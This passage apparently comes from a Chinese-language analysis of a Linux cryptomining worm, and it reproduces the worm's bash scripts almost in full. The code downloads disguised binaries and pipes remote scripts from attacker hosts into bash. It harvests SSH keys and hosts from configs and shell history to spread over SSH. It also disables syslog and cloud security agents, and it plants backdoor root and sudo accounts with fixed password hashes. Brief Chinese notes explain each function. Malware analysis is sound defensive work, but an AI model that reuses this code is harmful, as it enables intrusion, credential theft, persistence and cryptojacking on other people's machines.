		        MEM=`(free -h | gawk '/Mem:/{print $2}' | rev | cut -c 2- | rev | xargs printf "%.*f\n" 0)`
		        echo "p:$PROC, m:$MEM"
		        #check if cores > 1 and do not scan if only single core
		        scanlimit=2
		        if [ "$PROC" -lt "$scanlimit" ]; then
		                echo "less than 2 cores, dont start scanning yet"
		        else
		                echo "greater than 2 cores, START SCANNING!"
		                scango
		        fi
		
		}
		
		scango() {
		        dpkg --configure -a
		        screen -wipe >/dev/null
		        ps aux | grep "dmS cock" | grep -vw grep >/dev/null
		        if [ $? -eq 0 ]; then
		                echo "running"
		        else
		                echo "need to start"
		                pkill screen
		                cat /etc/os-release | grep -vw grep | grep "rhel" >/dev/null
		                if [ $? -eq 0 ]; then
		                        yum remove epel-release -y
		                        rpm -ivh https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm
		                        rpm -ivh https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpm
		                else
		                        echo "no need"
		                fi
		                if md5sum --status -c - <<<"83acf5a32d84330bbb0103f2169e10bb /usr/bin/zgrab"; then
		                        echo ""
		                else
		                        zgrabz1="http://uupload.ir/files/"
		                        zgrabz2="https://s.put.re/"
		                        zgrabscrape1="https://fuskbugg.se/"
		                        zgrabzar1=("epjn_zgrab.jpg" "4ih_zgrab.jpg" "kfdd_zgrab.jpg" "k4l8_zgrab.jpg")
		                        zgrabzar2=("1ghKpDSA.jpg" "1mR8WfJd.jpg" "1qUqWBMx.jpg" "2XmTPE5G.jpg" "38FqoSBL.jpg" "8BqzUEE8.jpg" "dqY7fmbn.jpg" "fjY69WMZ.jpg" "GWj4vteM.jpg" "Hb4Km7TL.jpg" "j8X4Zzc7.jpg" "Lgj775pY.jpg" "ML5Jj2F6.jpg" "RARm5CMk.jpg" "SFcKoguW.jpg" "sv5evTRR.jpg" "twuY28Nv.jpg" "Va8Ah4wR.jpg" "Wmm44FfX.jpg" "Yj5dX3uk.jpg")
		                        zgrabscrapear1=("1fRfidDen8" "39R6idD9n7" "52Rbi5D7ne" "BcR3ibDen0")
		                        chattr -iua /usr/bin/zgrab
		                        curl -L -o /usr/bin/zgrab $zgrabz1${zgrabzar1[$RANDOM % ${#zgrabzar1[@]}]} || curl -sKL -o /usr/bin/zgrab $zgrabz2${zgrabzar2[$RANDOM % ${#zgrabzar2[@]}]}
		                        chmod +x /usr/bin/zgrab
		                fi
		                if md5sum --status -c - <<<"83acf5a32d84330bbb0103f2169e10bb /usr/bin/zgrab"; then
		                        echo ""
		                else
		                        zgrabz1="http://uupload.ir/files/"
		                        zgrabz2="https://s.put.re/"
		                        zgrabscrape1="https://fuskbugg.se/"
		                        zgrabzar1=("epjn_zgrab.jpg" "4ih_zgrab.jpg" "kfdd_zgrab.jpg" "k4l8_zgrab.jpg")
		                        zgrabzar2=("1ghKpDSA.jpg" "1mR8WfJd.jpg" "1qUqWBMx.jpg" "2XmTPE5G.jpg" "38FqoSBL.jpg" "8BqzUEE8.jpg" "dqY7fmbn.jpg" "fjY69WMZ.jpg" "GWj4vteM.jpg" "Hb4Km7TL.jpg" "j8X4Zzc7.jpg" "Lgj775pY.jpg" "ML5Jj2F6.jpg" "RARm5CMk.jpg" "SFcKoguW.jpg" "sv5evTRR.jpg" "twuY28Nv.jpg" "Va8Ah4wR.jpg" "Wmm44FfX.jpg" "Yj5dX3uk.jpg")
		                        zgrabscrapear1=("1fRfidDen8" "39R6idD9n7" "52Rbi5D7ne" "BcR3ibDen0")
		                        chattr -iua /usr/bin/zgrab
		                        curl -L -o /usr/bin/zgrab $(curl -sL $zgrabscrape1${zgrabscrapear1[$RANDOM % ${#zgrabscrapear1[@]}]} | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
		                        chmod +x /usr/bin/zgrab
		                fi
		                if md5sum --status -c - <<<"83acf5a32d84330bbb0103f2169e10bb /usr/bin/zgrab"; then
		                        echo ""
		                else
		                        zgrabz1="http://uupload.ir/files/"
		                        zgrabz2="https://s.put.re/"
		                        zgrabscrape1="https://fuskbugg.se/"
		                        zgrabzar1=("epjn_zgrab.jpg" "4ih_zgrab.jpg" "kfdd_zgrab.jpg" "k4l8_zgrab.jpg")
		                        zgrabzar2=("1ghKpDSA.jpg" "1mR8WfJd.jpg" "1qUqWBMx.jpg" "2XmTPE5G.jpg" "38FqoSBL.jpg" "8BqzUEE8.jpg" "dqY7fmbn.jpg" "fjY69WMZ.jpg" "GWj4vteM.jpg" "Hb4Km7TL.jpg" "j8X4Zzc7.jpg" "Lgj775pY.jpg" "ML5Jj2F6.jpg" "RARm5CMk.jpg" "SFcKoguW.jpg" "sv5evTRR.jpg" "twuY28Nv.jpg" "Va8Ah4wR.jpg" "Wmm44FfX.jpg" "Yj5dX3uk.jpg")
		                        zgrabscrapear1=("1fRfidDen8" "39R6idD9n7" "52Rbi5D7ne" "BcR3ibDen0")
		                        chattr -iua /usr/bin/zgrab
		                        curl -L -o /usr/bin/zgrab $zgrabz1${zgrabzar1[$RANDOM % ${#zgrabzar1[@]}]} || curl -sKL -o /usr/bin/zgrab $zgrabz2${zgrabzar2[$RANDOM % ${#zgrabzar2[@]}]}
		                        chmod +x /usr/bin/zgrab
		                fi
		                which masscan >/dev/null
		                if [ $? -eq 0 ]; then
		                        echo ""
		                else
		                        yum install -y masscan || apt-get install masscan -y
		                        chmod +x /var/run/*
		                fi
		
		                which jq >/dev/null
		                if [ $? -eq 0 ]; then
		                        echo ""
		                else
		                        yum install -y jq || apt-get install jq -y
		                fi
		                which screen
		                if [ $? -eq 0 ]; then
		                        echo ""
		                else
		                        yum install -y screen || apt-get install screen -y
		                fi
		                scanscrape1="http://xanthe.anondns.net:8080/files/"
		                actionscrape="https://letsupload.cc/"
		                scanarray1=("mxutzh.sh" "qiumb.sh")
		                #scrapeurl=$(curl -A scrapppee/1.9 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)
		                rndscreen0=cock$(head /dev/urandom | tr -dc a-z0-9 | head -c 5)
		                screen -dmS $rndscreen0
		                sleep 1s
		                #goog
		                screen -r $rndscreen0 -p 0 -X stuff $"bash\n"
		                screen -r $rndscreen0 -p 0 -X stuff $"curl -A scanner/1.5 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"3eS7MaDcn6 | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n"
		                sleep 2s
		                rndscreen1=cock$(head /dev/urandom | tr -dc a-z0-9 | head -c 5)
		                screen -dmS $rndscreen1
		                sleep 1s
		                #amz
		                screen -r $rndscreen1 -p 0 -X stuff $'bash\n'
		                screen -r $rndscreen1 -p 0 -X stuff $"curl -A scanner/1.5 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"lbS4M5Dbn2 | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n"
		                sleep 2s
		                rndscreen2=cock$(head /dev/urandom | tr -dc a-z0-9 | head -c 5)
		                screen -dmS $rndscreen2
		                sleep 1s
		                #ovh
		                screen -r $rndscreen2 -p 0 -X stuff $'bash\n'
		                screen -r $rndscreen2 -p 0 -X stuff $"curl -A scanner/1.5 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"J2S1MaDbn9 | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n"
		                sleep 2s
		                rndscreen3=cock$(head /dev/urandom | tr -dc a-z0-9 | head -c 5)
		                screen -dmS $rndscreen3
		                sleep 1s
		                #cn
		                screen -r $rndscreen3 -p 0 -X stuff $'bash\n'
		                screen -r $rndscreen3 -p 0 -X stuff $"curl -A scanner/1.5 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"r6SdMfD8n5 | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n"
		                sleep 2s
		                rndscreen4=cock$(head /dev/urandom | tr -dc a-z0-9 | head -c 5)
		                screen -dmS $rndscreen4
		                sleep 1s
		                #do
		                screen -r $rndscreen4 -p 0 -X stuff $'bash\n'
		                screen -r $rndscreen4 -p 0 -X stuff $"curl -A scanner/1.5 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"B1S4M1D7n9 | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n"
		                sleep 2s
		                rndscreen5=cock$(head /dev/urandom | tr -dc a-z0-9 | head -c 5)
		                screen -dmS $rndscreen5
		                sleep 1s
		                #de
		                screen -r $rndscreen5 -p 0 -X stuff $'bash\n'
		                screen -r $rndscreen5 -p 0 -X stuff $"curl -A scanner/1.5 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"v6S5M6D4n8 | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n"
		                sleep 2s
		                rndscreen6=cock$(head /dev/urandom | tr -dc a-z0-9 | head -c 5)
		                screen -dmS $rndscreen6
		                sleep 1s
		                #msft
		                screen -r $rndscreen6 -p 0 -X stuff $'bash\n'
		                screen -r $rndscreen6 -p 0 -X stuff $"curl -A scanner/1.5 -L $scanscrape1${scanarray1[$RANDOM % ${#scanarray1[@]}]} | bash -s $(curl -sL "$actionscrape"B1S4M1D7n9 | grep -i "cdn-" | sed -r 's/.*href="([^"]+).*/\1/g' | head -1)\n"
		        fi
		}
		
		localgo() {
		        myhostip=$(curl -sL icanhazip.com)
		        KEYS=$(find ~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub)
		        KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
		        KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' '{print $2}' | awk '{print $1'})
		        KEYS4=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
		        HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
		        HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
		        HOSTS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $2}' | awk -F '{print $1}')
		        HOSTS4=$(cat /etc/hosts | grep -vw "0.0.0.0" | grep -vw "127.0.1.1" | grep -vw "127.0.0.1" | grep -vw $myhostip | sed -r '/\n/!s/[0-9.]+/\n&\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}')
		        HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
		        HOSTS6=$(ps auxw | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep ":22" | uniq)
		        USERZ=$(
		                echo "root"
		                find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq | grep -wv ".ssh"
		        )
		        USERZ2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq)
		        sshports=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '-p' '{print $2}' | awk '{print $1}' | sed 's/[^0-9]*//g' | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | sed -e "\$a22")
		        userlist=$(echo "$USERZ $USERZ2" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2- | grep -vw "." | grep -vw "ssh" | sed '/\./d')
		        hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3 $HOSTS4 $HOSTS5 $HOSTS6" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
		        keylist=$(echo "$KEYS $KEYS2 $KEYS3 $KEYS4" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
		        i=0
		        for user in $userlist; do
		                for host in $hostlist; do
		                        for key in $keylist; do
		                                for sshp in $sshports; do
		                                        ((i++))
		                                        if [ "${i}" -eq "20" ]; then
		                                                sleep 5
		                                                ps wx | grep "ssh -o" | awk '{print $1}' | xargs kill -9 &>/dev/null &
		                                                i=0
		                                        fi
		
		                                        #Wait 5 seconds after every 20 attempts and clean up hanging processes
		
		                                        chmod +r $key
		                                        chmod 400 $key
		                                        echo "$user@$host"
		                                        ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "sudo curl -A hostchk/1.5 -L http://xanthe.anondns.net:8080/files/xanthe | sudo bash -s;"
		                                        ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=3 -i $key $user@$host -p $sshp "curl -A hostchk/1.5 -L http://xanthe.anondns.net:8080/files/xanthe | bash -s;"
		                                done
		                        done
		                done
		        done
		}
		stopscan() {
		        sudo killall screen
		        ps aux | grep -v grep | grep 'docker' | awk '{print $2}' | xargs -I % kill -9 %
		        ps aux | grep -v grep | grep 'screen' | awk '{print $2}' | xargs -I % kill -9 %
		        ps aux | grep -v grep | grep 'curl' | awk '{print $2}' | xargs -I % kill -9 %
		}
		
		initializego
		filegetgo
		filesetupgo
		#filerungo
		sshdconfig
		resetsshgo
		scancheck
		#scango
		#stopscan
		localgo

```
主要是这几个函数，主要套路就是先判断文件有没有，没有就通过curl下载，如果curl或者一些软件功能没有安装，都会自动安装并下载，基本上已安装的软件也会校验一下MD5值，这个地方考虑的很周到，简单改名字什么的，蒙不过去。
```
		initializego   #通过firstrun-update.pid 判断是否感染，未感染就下载脚本感染
		filegetgo      #查看var/tmp/bbb/config.json ，/var/tmp/bbb ，主要是获取挖矿的主程序和配置文件
		filesetupgo    #顾名思义，启动之后又去下东西，好像是测试ip的
		filestartgo    #给挖矿文件加ia权限，如果没运行，就继续运行，会一直尝试运行，还会改nr_hugepages
		sshdconfig     #这个就是搞ssh的配置了，开启root的远程连接，禁止密码登录，然后关掉ip反解析，后面会给host文件
		resetsshgo     #重启sshd服务
		scancheck      #扫描检查，如果大于2核的机器，就会执行scango
		#scango        #开一个screen，如果是红帽的系统，或免费帮你安装epel，再安装zgrab，masscan，通过这些软件再扫描其他机器，不过该方法应该还未完成
		#stopscan      #关闭screen ，docker，curl
		localgo        #通过本地的一些命令，历史记录，端口，用本地的rsa去感染其他机器，如果是跳板机的话容易感染目标机器
```

还一个fczyo脚本：
```
#!/bin/bash
#thanks for everything
#                                                                     $$\    $$$$$$\
#                                                                   $$$$ |  $$  __$$\
# $$$$$$\   $$$$$$\   $$$$$$$\  $$$$$$\   $$$$$$$\        $$\   $$\ \_$$ |  \__/  $$ |
#$$  __$$\ $$  __$$\ $$  _____|$$  __$$\ $$  _____|       \$$\ $$  |  $$ |   $$$$$$  |
#$$ /  $$ |$$ /  $$ |\$$$$$$\  $$$$$$$$ |$$ /              \$$$$  /   $$ |  $$  ____/
#$$ |  $$ |$$ |  $$ | \____$$\ $$   ____|$$ |              $$  $$<    $$ |  $$ |
#\$$$$$$  |$$$$$$$  |$$$$$$$  |\$$$$$$$\ \$$$$$$$\        $$  /\$$\ $$$$$$\ $$$$$$$$\
# \______/ $$  ____/ \_______/  \_______| \_______|$$$$$$\\__/  \__|\______|\________|
#          $$ | pwning to pwn                      \______|
#          $$ | if this script helped you make some $$ mining monero, throw a little my way?
#          \__| Monero: 47TmDBB14HuY7xw55RqU27EfYyzfQGp6qKmfg6f445eihemFMn3xPhs8e1qM726pVj6XKtyQ1zqC24kqtv8fXkPZ7bvgSPU
#
#script_name="fczyo"
#echo $script_name
#if pidof -x "$script_name" -o $$ >/dev/null;then
#   echo "An another instance of this script is already running, please clear all the sessions of this script before starting a new session"
#   exit 1
#fi

killcommondockers() {
        docker ps | grep "/bin/bash" | awk '{print $1}' | xargs -I % docker rm -f %
        docker ps | grep "/bin/bash -c" | awk '{print $1}' | xargs -I % docker rm -f %
        docker ps | grep "bash.shell" | awk '{print $1}' | xargs -I % docker rm -f %
        docker ps | grep "cokkokotre1/update" | awk '{print $1}' | xargs -I % docker rm -f %
        docker ps | grep "lchaia/xmrig" | awk '{print $1}' | xargs -I % docker rm -f %
        docker ps | grep "patsissons/xmrig" | awk '{print $1}' | xargs -I % docker rm -f %
        docker ps | grep "challengerd/challengerd" | awk '{print $1}' | xargs -I % docker rm -f %
        docker ps | grep "pocosow" | awk '{print $1}' | xargs -I % docker rm -f %
        docker ps | grep "gakeaws" | awk '{print $1}' | xargs -I % docker rm -f %
        docker ps | grep "azulu" | awk '{print $1}' | xargs -I % docker rm -f %
        docker ps | grep "auto" | awk '{print $1}' | xargs -I % docker rm -f %
        docker ps | grep "xmr" | awk '{print $1}' | xargs -I % docker rm -f %
        docker ps | grep "mine" | awk '{print $1}' | xargs -I % docker rm -f %
        docker ps | grep "monero" | awk '{print $1}' | xargs -I % docker rm -f %
        ps aux | grep -v grep | grep '/bin/exin' | awk '{print $2}' | xargs -I % kill -9 %
        #ps aux | grep ssh | grep root@pts | awk '{print $2}' | xargs -I % kill -9 %
}
removefuckboiskeys() {
        cat /root/.ssh/authorized_keys | grep -vw grep | grep "AAAAB3NzaC1yc2EAAAABJQAAAQEAv3wmz70a9j03NaEpLqA3"
        if [ $? -eq 0 ]; then
                echo "key exists, removing."
                #ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAv3wmz70a9j03NaEpLqA3y2ZGo2pu2z7UT4F7tPsH1aWrjnXiSqgXHcDVjsXM/o93M+kfW5t6qs9z9cX4A4OVKr9UecXHAHhELa+5LSO59HaxLKMf/QBHVTqBlJkGo131MCnUOAonNQs0ldci5VpbDPBRKDB/U0drMt5VSiilLtssE2yRzV1SycnbEDH5F3vTHj+P0n/PZ8SKLt0YUXXV09eiSWjJl3gf1kf0PgvQbuLy1QhZ+YqS+wxSOfzt5n7BKn4WHObIZ53ZfWJyhx/C8thbjdZ72ipYuxDAvcWMfAAyvHLixoI9XnA9x/rkNB7dZHVyMdrmm++T8fZtZKLnGQ== rsa-key-20191213
                sudo chattr -ia /root/.ssh/authorized_keys
                sed -i '/^ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAv3wmz70a9j03NaEpLqA3y2ZGo2pu2z7UT4F7tPsH1aWrjnXiSqgXHcDVjsXM\/o93M+kfW5t6qs9z9cX4A4OVKr9UecXHAHhELa+5LSO59HaxLKMf\/QBHVTqBlJkGo131MCnUOAonNQs0ldci5VpbDPBRKDB\/U0drMt5VSiilLtssE2yRzV1SycnbEDH5F3vTHj+P0n\/PZ8SKLt0YUXXV09eiSWjJl3gf1kf0PgvQbuLy1QhZ+YqS+wxSOfzt5n7BKn4WHObIZ53ZfWJyhx\/C8thbjdZ72ipYuxDAvcWMfAAyvHLixoI9XnA9x\/rkNB7dZHVyMdrmm++T8fZtZKLnGQ== rsa-key-20191213/d' /root/.ssh/authorized_keys
                sudo chattr +ia /root/.ssh/authorized_keys
        else
                echo "root/authorized_keys clean"
        fi
        #sed: -e expression #1, char 99: unknown command: `o'
        cat /root/.ssh/authorized_keys | grep -vw grep | grep "AAAAB3NzaC1yc2EAAAADAQABAAABAQDvJvNNOFg4C9j2oys9"
        if [ $? -eq 0 ]; then
                echo "key exists, removing."
                sudo chattr -ia /root/.ssh/authorized_keys
                sed -i '/^ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDvJvNNOFg4C9j2oys9kXcmJhnZIY2RSu3BA2RIuQbt8ahRmPqYIoAOoXUzKEuYUQWuDxGlGLniFFuIMboV1gLCEEBgGW+xXNQoNBzMKkXgmuHRllBv+Ul8T3g6dAJsLdXFWUdsll4BT+oOPCtyPlB\/s19wPjgJ\/sQNij7txpA79LQItbGrRsFIu5o23Xx7HKR0ZD9BN+sxJPCnfQMJcHpqp4TU0ov9VVkWhzhsjlTcA0H2yNjDHq0KsPofCykp012Uiana3mOZE7JBrKzjV6UnQNiwDjSCwbpfVTFnws8tX+he2yLG\/16cb1kpfyzzB7DfJljD\/ZG\/SOS14LKZKboX localhost@server$/d' /root/.ssh/authorized_keys
                sudo chattr +ia /root/.ssh/authorized_keys
        else
                echo "root/authorized_keys clean"
        fi

        cat /root/.ssh/authorized_keys | grep -vw grep | grep "AAAAB3NzaC1yc2EAAAABJQAAAQEAgSuI+AZnPupl2EmCqUpE"
        if [ $? -eq 0 ]; then
                echo "key exists, removing."
                sudo chattr -ia /root/.ssh/authorized_keys
                sed -i '/^ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAgSuI+AZnPupl2EmCqUpEaDU6XY9IQ351UtAN3uRwZ\/q+VMuVfNfa0wCx\/kDA3t5VR6Dg92uGddGQUNDuDEQU7ahxVLrkPeYT2PjZhDOiBo9KupNBtCgF51djq9eaHZYYCBhPpNnACmUu0LK3w7JU0qbSR1zjcuFy7QUFgl5aRQDYW4yUcDqLVgnx\/LsW5VVHuA0GiWqCfBQto8hcGxH\/RUmajgYY13L8d+DrZyyAwHFcxQenWMX1RWx2+Hu2fLKq9LksDV+taJ\/UhXd546GqyHckLVQbc2EmhvjxVOjf0Ypyvwlfh8hBV5GkjSKdSNa+UpeiwuvOaBAUTcJCCRsBdw== root@localhost/d' /root/.ssh/authorized_keys
                sudo chattr +ia /root/.ssh/authorized_keys
        else
                echo "root/authorized_keys clean"
        fi
}

firstthingsfirst() {
        date +"%r"
        #Fix blocking blockchain.info
        sed -i '/^0.0.0.0 blockchain.info/d' /etc/hosts
        systemctl is-active --quiet syslog
        if [ $? -eq 0 ]; then
                echo "syslog is running, proceeding to stop and disable."
                service syslog stop
                systemctl disable syslog
        else
                echo "syslog is not running. Good day to you!"
        fi

        systemctl is-active --quiet hostguard
        if [ $? -eq 0 ]; then
                echo "hostguard is running, proceeding to stop."
                service hostguard stop
                service hostguard.service stop
                systemctl disable hostguard
                systemctl disable hostguard.service
        else
                echo "hostguard is not running. Good day to you!"
        fi

        systemctl is-active --quiet cloudResetPwdUpdateAgent
        if [ $? -eq 0 ]; then
                echo "cloudResetPwdUpdateAgent is running, proceeding to stop."
                service cloudResetPwdUpdateAgent stop
                service cloudResetPwdUpdateAgent.service stop
                systemctl disable cloudResetPwdUpdateAgent.service
                systemctl disable cloudResetPwdUpdateAgent
        else
                echo "cloudResetPwdUpdateAgent is not running. Good day to you!"
        fi

        cat /etc/os-release | grep -vw grep | grep "rhel" >/dev/null
        if [ $? -eq 0 ]; then
                # RHEL/CentOS and Fedora
                # sudo systemctl enable crond.service
                # sudo systemctl start crond.service
                systemctl is-active --quiet crond
                if [ $? -eq 0 ]; then
                        echo "(rhel, centos, fedora) - crond is already running"
                else
                        echo "crond is not running"
                        systemctl enable crond.service
                        service crond start
                fi
        else
                # Debian and Ubuntu
                # sudo systemctl enable cron.service
                # sudo systemctl start cron.service
                systemctl is-active --quiet cron
                if [ $? -eq 0 ]; then
                        echo "(Ubuntu, debian) - cron is already running"
                else
                        echo "cron is not running"
                        systemctl enable cron.service
                        service cron start
                fi

        fi

        chattr +ia /etc/rc.local
        chattr +ia /etc/rc.d/rc.local
        chattr +ia /etc/passwd
        chattr +ia /etc/shadow
        #chattr +ia /var/spool/cron/root;
        #rm -rf /etc/rc.d/'rc.local=';

        which nano >/dev/null
        if [ $? -eq 0 ]; then
                echo "nano already installed"
                export VISUAL=nano
        else
                echo "nano Not found....installing nano"
                cat /etc/os-release | grep -vw grep | grep "centos" >/dev/null
                if [ $? -eq 0 ]; then
                        echo "Verified CentOS/rhel/fedora/amazon linux"
                        yum install -y epel-release && yum install -y nano
                        export VISUAL=nano
                else
                        echo "Not CentOS/rhel/fedora/amazon linux"
                        apt-get install nano -y
                        export VISUAL=nano
                fi

                cat /etc/os-release | grep -vw grep | grep "rhel" >/dev/null
                if [ $? -eq 0 ]; then
                        echo "Verified Redhat Linux"
                        yum install -y epel-release && yum install -y nano
                        export VISUAL=nano
                else
                        echo "Not rhel"
                fi

        fi

        which htop >/dev/null
        if [ $? -eq 0 ]; then
                echo "htop already installed"
        else
                echo "htop Not found....installing htop"
                cat /etc/os-release | grep -vw grep | grep "centos" >/dev/null
                if [ $? -eq 0 ]; then
                        echo "Verified CentOS/rhel/fedora/amazon linux"
                        yum install -y epel-release && yum install -y htop
                else
                        echo "Not CentOS/rhel/fedora/amazon linux"
                        apt-get install htop -y
                fi
        fi
}

usercheckgo() {
        echo "checking users..."
        # initial
        if id "sysall" 2>/dev/null; then
                echo "sysall user already exists"
        else
                echo "sysall user does not exist, creating..."
                chattr -ia /etc/passwd
                chattr -ia /etc/shadow
                groupdel sysall
                useradd -M -u 0 -o -p 'bAC5QOFFSK9bo' -s /bin/bash -d /root sysall
                #useradd -m -p '7Pvsd3qh8Rx1c' sysall;
                #usermod -aG sudoers sysall;
                usermod -aG root sysall
                #adduser sysall sudo;
                chattr -ia /etc/sudoers
                echo "sysall    ALL=(ALL)       ALL" >>/etc/sudoers
                chattr +ia /etc/sudoers
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
                echo "sysall user added"
        fi

        if id "system" 2>/dev/null; then
                echo "system user already exists"
        else
                echo "system user does not exist, creating..."
                chattr -ia /etc/passwd
                chattr -ia /etc/shadow
                useradd -M -p 'bAC5QOFFSK9bo' -s /bin/bash -d /root system
                usermod -aG root system
                chattr -ia /etc/sudoers
                echo "system    ALL=(ALL)       ALL" >>/etc/sudoers
                chattr +ia /etc/sudoers
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
                echo "system user added"
        fi

        if id "logger" 2>/dev/null; then
                echo "logger user already exists"
        else
                echo "logger user does not exist, creating..."
                chattr -ia /etc/passwd
                chattr -ia /etc/shadow
                useradd -p 'bAC5QOFFSK9bo' -G root -s /bin/bash -d /opt/logger logger
                usermod -aG root logger
                chattr -ia /etc/sudoers
                echo "logger    ALL=(ALL)       ALL" >>/etc/sudoers
                chattr +ia /etc/sudoers
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
                echo "logger user added"
        fi

        if id "autoupdater" 2>/dev/null; then
                echo "autoupdater user already exists"
        else
                echo "autoupdater user does not exist, creating..."
                chattr -ia /etc/passwd
                chattr -ia /etc/shadow
                useradd -p 'bAC5QOFFSK9bo' -s /bin/bash -d /opt/autoupdater autoupdater
                usermod -aG root autoupdater
                chattr -ia /etc/sudoers
                echo "autoupdater    ALL=(ALL)       ALL" >>/etc/sudoers
                chattr +ia /etc/sudoers
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
                echo "autoupdater user added"
        fi

        if id "darmok" 2>/dev/null; then
                chattr -ia /etc/passwd
                chattr -ia /etc/shadow
                echo "user exists, deleting..."
                userdel -rf darmok
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
        else
                echo "darmok user does not exist."
        fi

        if id "cokkokotre1" 2>/dev/null; then
                chattr -ia /etc/passwd
                chattr -ia /etc/shadow
                echo "user exists, deleting..."
                userdel -rf cokkokotre1
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
        else
                echo "cokkokotre1 user does not exist."
        fi

        if id "akay" 2>/dev/null; then
                chattr -ia /etc/passwd
                chattr -ia /etc/shadow
                echo "user exists, deleting..."
                userdel -rf akay
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
        else
                echo "akay user does not exist."
        fi

        if id "o" 2>/dev/null; then
                chattr -ia /etc/passwd
                chattr -ia /etc/shadow
                echo "user exists, deleting..."
                userdel -rf o
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
        else
                echo "o user does not exist."
        fi

        if id "phishl00t" 2>/dev/null; then
                chattr -ia /etc/passwd
                chattr -ia /etc/shadow
                echo "user exists, deleting..."
                userdel -rf phishl00t
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
        else
                echo "phishl00t user does not exist."
        fi

        if id "opsecx12" 2>/dev/null; then
                chattr -ia /etc/passwd
                chattr -ia /etc/shadow
                echo "user exists, deleting..."
                userdel -rf opsecx12
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
        else
                echo "opsecx12 user does not exist."
        fi

        # allow root SSH Login
        #chattr -ia /etc/ssh/sshd_config;
        #chmod 644 /etc/ssh/sshd_config;
        #sed -i '/.PermitRootLogin*/d' /etc/ssh/sshd_config
        #sed -i '/PermitRootLogin*/d' /etc/ssh/sshd_config

        #echo "PermitRootLogin yes" >> /etc/ssh/sshd_config
        #chmod 544 /etc/ssh/sshd_config;
        #chattr +ia /etc/ssh/sshd_config;
        #needreset=1;
}

fixgroupalreadyexists() {
        if id "logger" 2>/dev/null; then
                echo "logger user already exists"
                chattr -ia /etc/passwd
                chattr -ia /etc/shadow
                usermod -p 'bAC5QOFFSK9bo' logger
                chattr +ia /etc/passwd
                chattr +ia /etc/shadow
        else
                echo "logger user does not exist, creating..."
                chattr -ia /etc/passwd
                chattr -ia /etc/shadow
                useradd -p 'bAC5QOFFSK9bo' -G root -s /bin/bash -g logger -d /opt/logger logger
                #usermod -aG root logger;
